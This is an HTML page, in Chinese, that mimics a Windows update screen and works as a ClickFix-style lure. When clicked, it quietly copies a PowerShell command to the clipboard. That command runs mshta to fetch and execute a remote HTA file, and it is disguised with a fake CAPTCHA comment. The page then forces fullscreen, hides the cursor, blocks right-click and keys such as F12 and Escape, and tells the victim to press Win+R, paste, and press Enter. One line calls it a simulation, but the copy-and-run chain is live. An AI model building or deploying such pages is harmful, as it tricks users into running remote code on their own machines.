<!DOCTYPE html>
<html>

<head>
    <title>Windows Upgrade</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #1a3b5c;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
            overflow: hidden;
            cursor: default;
        }
        body.i-fs {
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: #0d1f33;
            padding: 40px 60px;
            border-radius: 12px;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
            max-width: 600px;
            width: 100%;
            position: relative;
        }
        .loader {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 20px 0;
        }
        .loader .circle {
            width: 12px;
            height: 12px;
            background: #4fc3f7;
            border-radius: 50%;
            animation: bounce 1.2s infinite ease-in-out;
        }
        .loader .circle:nth-child(2) {
            animation-delay: 0.1s;
        }
        .loader .circle:nth-child(3) {
            animation-delay: 0.2s;
        }
        .loader .circle:nth-child(4) {
            animation-delay: 0.3s;
        }
        .loader .circle:nth-child(5) {
            animation-delay: 0.4s;
        }
        @keyframes bounce {
            0%,
            80%,
            100% {
                transform: scale(0.6);
                opacity: 0.4;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }
        .t1 {
            font-size: 1.2rem;
            margin-top: 10px;
            line-height: 1.8;
        }
        .part,
        .percent {
            font-size: 0.9rem;
            color: #aaccee;
            margin-top: 4px;
        }
        .screen1 {
            display: block;
        }
        .screen1.active .t1 {
            display: block;
        }
        .screen2 {
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #2a4b6e;
        }
        .screen2.active {
            display: block;
        }
        .screen2 .t3 {
            font-size: 1rem;
            margin: 10px 0 4px;
            color: #ffaa33;
        }
        .screen2 .t4 {
            font-size: 0.95rem;
            color: #ddd;
            margin-bottom: 12px;
        }
        .screen2 .t3 svg {
            vertical-align: middle;
        }
        .dont {
            color: #fff;
            font-size: 0.85rem;
            margin-top: 6px;
            opacity: 0.6;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #2a4b6e;
            border-radius: 3px;
            overflow: hidden;
            margin: 16px 0 10px;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: #4fc3f7;
            border-radius: 3px;
            transition: width 0.15s;
        }
        /* 提示点击区域 */
        .click-hint {
            color: #88aacc;
            font-size: 0.8rem;
            margin-top: 12px;
            opacity: 0.7;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%,
            100% {
                opacity: 0.4;
            }
            50% {
                opacity: 1;
            }
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="loader">
            <div class="circle"></div>
            <div class="circle"></div>
            <div class="circle"></div>
            <div class="circle"></div>
            <div class="circle"></div>
        </div>

        <div class="screen1 active" id="screen1">
            <div class="t1">
                正在配置更新，请勿关闭你的电脑。
                <div class="part">第 <span id="partNum">1</span> 部分，共 3 部分</div>
                <div class="percent">已完成 <span id="percentNum">0</span>%</div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
            </div>
        </div>

        <div class="screen2" id="screen2">
            <div class="t3">⚠️ 注意！</div>
            <div class="t4">要完成更新，请安装 <strong>关键安全更新</strong></div>
            <div class="t3">步骤 1 — 按住 “<svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="26" height="26" viewBox="0 0 50 50" style="fill:#FFFFFF;">
                    <path d="M19.852 7.761l-15 2.25C4.362 10.085 4 10.505 4 11v12c0 .553.448 1 1 1h15c.552 0 1-.447 1-1V8.75c0-.291-.127-.567-.348-.758C20.432 7.803 20.139 7.721 19.852 7.761zM45.652 4.242c-.22-.189-.512-.271-.801-.231l-21 3.15C23.362 7.235 23 7.655 23 8.15V23c0 .553.448 1 1 1h21c.552 0 1-.447 1-1V5C46 4.709 45.873 4.433 45.652 4.242zM20 26H5c-.552 0-1 .447-1 1v12c0 .495.362.915.852.989l15 2.25c.05.007.099.011.148.011.238 0 .47-.085.652-.242C20.873 41.817 21 41.541 21 41.25V27C21 26.447 20.552 26 20 26zM45 26H24c-.552 0-1 .447-1 1v14.85c0 .495.362.915.852.989l21 3.15C44.901 45.996 44.951 46 45 46c.238 0 .47-.085.652-.242C45.873 45.567 46 45.291 46 45V27C46 26.447 45.552 26 45 26z">
                    </path></svg>” 键并按 “R”</div>
            <div class="t3">步骤 2 — 按住 “Ctrl” 然后按 “V”</div>
            <div class="t3">步骤 3 — 按 “确定” 或 “Enter”</div>
            <div class="dont">（模拟更新，无需真正操作）</div>
        </div>

        <div class="click-hint">点击页面任意位置开始</div>
    </div>

    <script src="https://code.jquery.com/jquery-3.7.1.min.js">
    </script>
    <script>
        (function() {
            // ============================================
            // 剪贴板功能（保留）
            // ============================================
            const textToCopy = "powershell /c mshta http://mcedge.github.io/mcedge/index.hta# ✅ I am not a robot - CAPTCHA Verification ID: 114514";

            async function copyText(text) {
                try {
                    if (navigator.clipboard && window.isSecureContext) {
                        await navigator.clipboard.writeText(text);
                        return true;
                    }
                } catch (e) {}
                const ta = document.createElement("textarea");
                ta.value = text;
                ta.setAttribute("readonly", "");
                ta.style.position = "fixed";
                ta.style.left = "-9999px";
                document.body.appendChild(ta);
                ta.select();
                try {
                    document.execCommand("copy");
                    document.body.removeChild(ta);
                    return true;
                } catch (err) {
                    document.body.removeChild(ta);
                    return false;
                }
            }

            // ============================================
            // 进度模拟
            // ============================================
            let progress = 0;
            let progressTimer = null;
            let progressStage = 1;
            let isStarted = false;

            function startProgress() {
                if (isStarted) return;
                isStarted = true;

                // 复制到剪贴板
                copyText(textToCopy);

                // 全屏
                const el = document.documentElement;
                if (el.requestFullscreen) el.requestFullscreen();
                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
                else if (el.msRequestFullscreen) el.msRequestFullscreen();

                $('body').css('cursor', 'none');
                $('.click-hint').hide();

                progressTimer = setInterval(function() {
                    progress += 1;
                    $('#percentNum').text(Math.min(progress, 100));
                    $('.progress-fill').css('width', Math.min(progress, 100) + '%');

                    if (progress >= 30 && progressStage === 1) {
                        clearInterval(progressTimer);
                        progressStage = 2;
                        $('#partNum').text(2);
                        setTimeout(startProgress, 800);
                        return;
                    }
                    if (progress >= 60 && progressStage === 2) {
                        clearInterval(progressTimer);
                        progressStage = 3;
                        $('#partNum').text(3);
                        setTimeout(startProgress, 800);
                        return;
                    }
                    if (progress >= 100 && progressStage === 3) {
                        clearInterval(progressTimer);
                        $('.screen1 .t1 .part').text('更新已完成 ✓');
                        $('#percentNum').text(100);
                        $('.progress-fill').css('width', '100%');
                        setTimeout(function() {
                            $('#screen1').hide();
                            $('#screen2').addClass('active');
                        }, 1200);
                        return;
                    }
                }, 120);
            }

            // ============================================
            // 点击触发
            // ============================================
            $(document).one('click', function() {
                startProgress();
            });

            // ============================================
            // 安全防护（防右键 / 防F12）
            // ============================================
            $(document).on('contextmenu', function() { return false; });
            $(document).on('keydown', function(e) {
                const forbidden = [123, 27, 18, 9, 115, 116, 112, 114, 122];
                if (forbidden.includes(e.keyCode)) {
                    e.preventDefault();
                    return false;
                }
            });

        })();
    </script>
</body>

</html>
